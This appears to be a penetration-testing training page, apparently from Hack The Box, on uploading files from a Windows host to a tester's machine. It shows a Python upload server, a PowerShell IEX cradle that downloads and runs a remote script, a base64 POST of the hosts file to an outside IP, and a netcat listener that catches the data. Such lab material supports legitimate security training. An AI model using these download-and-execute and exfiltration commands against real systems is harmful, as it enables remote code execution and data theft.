## Installing a Configured WebServer with Upload

```Shell
3kjS@htb[/htb]$ pip3 install uploadserver
```

```Shell
3kjS@htb[/htb]$ python3 -m uploadserver
```

## PowerShell Script to Upload a File to Python Upload Server

```Powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') 
PS C:\htb> Invoke-FileUpload -Uri http://<IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts 

[+] File Uploaded: C:\Windows\System32\drivers\etc\hosts 
[+] FileHash: 5E7241D66FD77E9E8EA866B6278B2373
```

## PowerShell Base64 Web Upload

```Powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)) 
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

```Shell
3kjS@htb[/htb]$ nc -lvnp 8000
```

```Shell 
3kjS@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

